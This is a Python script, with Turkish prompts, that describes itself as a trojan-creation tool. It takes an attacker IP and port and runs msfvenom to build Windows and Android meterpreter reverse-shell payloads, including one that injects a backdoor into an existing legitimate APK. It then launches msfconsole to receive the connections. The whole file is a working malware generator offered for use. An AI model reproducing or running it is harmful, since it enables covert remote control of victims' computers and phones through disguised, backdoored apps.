#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet MYS TROJEN OLUSTURMA ARACI")
print("""
Trojen olusturma aracına hoş geldin.
""")
ip = input("Local veya Dıs ip giriniz : ")
port = input("Port Giriniz : ")
print("""
1)windows/meterpreter/reverse_tcp
2)windows/meterpreter/reverse_http
3)android/meterpreter/reverse_tcp
4)Backdoor Birlestirme (APK)
""")
paylaod = input("Payload No Giriniz : ")
kayityeri = input("Kayıt Yeri Giriniz : ")
orjinalapk = input("Orjinal apk dosyasının yolu (Sadece 4 için geçerlidir !): ")
if(paylaod=="1"):
    os.system("msfvenom -p windows/meterpreter/reverse_tcp  LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri )
elif(paylaod=="2"):
    os.system("msfvenom -p windows/meterpreter/reverse_http  LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri )
elif(paylaod=="3"):
    os.system("msfvenom -p android/meterpreter/reverse_tcp  LHOST=" + ip + " LPORT=" + port + " -o " + kayityeri )
elif(paylaod=="4"):
    os.system("msfvenom -x " + orjinalapk + " -p android/meterpreter/reverse_tcp  LHOST=" + ip + " LPORT=" + port + " -o " + kayityeri )
os.system("msfconsole")
